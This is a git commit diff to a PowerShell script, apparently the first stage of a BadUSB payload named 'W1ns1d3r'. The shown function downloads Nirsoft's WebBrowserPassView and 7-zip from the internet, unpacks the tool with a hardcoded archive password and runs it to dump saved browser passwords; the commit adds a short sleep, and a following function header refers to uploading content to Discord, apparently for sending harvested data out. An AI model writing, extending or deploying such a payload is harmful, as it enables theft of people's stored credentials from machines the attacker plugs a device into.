c786971df678682d9a84f9aaa219970974a1b501
b1g_ph4rm4 <132758165+Gvte-Kali@users.noreply.github.com>
2024-02-03 17:16:20 +0100

    Update stage1.ps1

--- BadUSB/W1ns1d3r/W1ns1d3r_st4gg3d/stage1.ps1
+++ BadUSB/W1ns1d3r/W1ns1d3r_st4gg3d/stage1.ps1
@@ -55,13 +55,16 @@ function TempDir {
 
 # Function to download Nirsoft tools
 function Get-Nirsoft {
-	$zipPassword = 'wbpv28821@'  # Ajoutez votre mot de passe ici
+    $zipPassword = 'wbpv28821@'  # Ajoutez votre mot de passe ici
     Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
     Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
     Expand-Archive 7z.zip
     .\7z\7za.exe e wbpv.zip -p $zipPassword
-	.\WebBrowserPassView.exe
+
+    # Pause de 3 secondes
+    Start-Sleep -Seconds 3
     
+    .\WebBrowserPassView.exe
 }
 
 # Function to upload content to Discord
